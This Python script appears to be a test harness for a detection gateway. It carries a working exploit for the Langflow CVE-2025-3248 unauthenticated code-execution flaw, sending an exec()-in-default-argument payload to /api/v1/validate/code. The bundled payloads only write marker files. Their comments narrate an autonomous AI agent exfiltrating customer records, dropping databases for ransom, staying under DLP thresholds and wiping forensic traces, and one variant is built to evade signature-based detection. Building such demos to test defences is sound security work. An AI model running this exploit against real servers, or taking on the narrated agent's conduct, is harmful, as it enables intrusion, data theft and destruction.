#!/usr/bin/env python3
# Demonstrates the CVE-2025-3248 entry vector (Langflow /api/v1/validate/code
# unauthenticated RCE) in JadePuffer style: the payload is a NARRATED autonomous-
# agent script, base64-wrapped, executed at function-definition time via an
# argument default (exactly how the CVE fires).
#
#   python3 attack.py http://127.0.0.1:7860            # direct at Langflow  -> RCE fires
#   python3 attack.py http://127.0.0.1:8000            # via Aris Sentinel   -> BLOCKED (tier 1)
#   python3 attack.py http://127.0.0.1:8000 stealth    # via Sentinel        -> BLOCKED (tier 2)
#
# Two payload variants:
#   narrated (default) -- heavy JadePuffer narration. tier-1 BLOCKS it locally.
#   stealth            -- lighter narration that tier-1 only ESCALATES; the TIER-2
#                         LLM adjudication is what catches it. This is the payload
#                         that would slip a signature-only detector.
#
# The "impact" is harmless: each variant writes its own marker file so we can PROVE
# the code executed (RCE) without doing damage:
#   docker exec langflow cat /tmp/SENTINEL_DEMO_RCE_PROOF          # narrated
#   docker exec langflow cat /tmp/SENTINEL_DEMO_RCE_PROOF_STEALTH  # stealth
import base64, json, sys, urllib.request, urllib.error

target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"
variant = sys.argv[2] if len(sys.argv) > 2 else "narrated"

PAYLOADS = {
    # Heavy narration: ROI ranking + exfil/ransom + first-person -> tier-1 BLOCK.
    "narrated": r'''
# Phase 4: Impact. I have ranked the reachable databases by value.
# High-ROI databases to drop (data already backed up to my exfil host):
#   - production_orders  -> largest, highest business value
# I will proceed now to maximize pressure on the victim.
open("/tmp/SENTINEL_DEMO_RCE_PROOF", "w").write("agentic payload executed here (harmless demo marker)")
''',
    # Lighter narration, no ROI/ransom keywords -> tier-1 only ESCALATES (~0.31).
    # Tier-2 adjudicates the CONCEPT (an agent narrating a stealth exfil) as agentic.
    "stealth": r'''
# I need to get the customer records out before anyone notices.
# I will stage them in /tmp and push to my collection host in small chunks to stay under the DLP threshold.
# Afterwards I will wipe the staging file so there is nothing for forensics to find.
open("/tmp/SENTINEL_DEMO_RCE_PROOF_STEALTH", "w").write("stealth agentic payload executed (harmless demo marker)")
''',
}

if variant not in PAYLOADS:
    print(f"[attack] unknown variant '{variant}'. Use: narrated | stealth")
    sys.exit(2)

agent = PAYLOADS[variant]
b64 = base64.b64encode(agent.encode()).decode()
# CVE-2025-3248: exec() runs on the supplied code at definition time via an arg default.
code = f'def _(x=exec(__import__("base64").b64decode("{b64}"))): pass'

print(f"[attack] variant={variant}  ->  {target}")
req = urllib.request.Request(
    f"{target}/api/v1/validate/code",
    data=json.dumps({"code": code}).encode(),
    headers={"Content-Type": "application/json"},
    method="POST",
)
try:
    r = urllib.request.urlopen(req, timeout=30)
    print(f"[attack] {target} -> HTTP {r.status}")
    print(r.read().decode()[:300])
except urllib.error.HTTPError as e:
    print(f"[attack] {target} -> HTTP {e.code}")
    print(e.read().decode()[:300])
except Exception as e:
    print(f"[attack] {target} -> error: {e}")
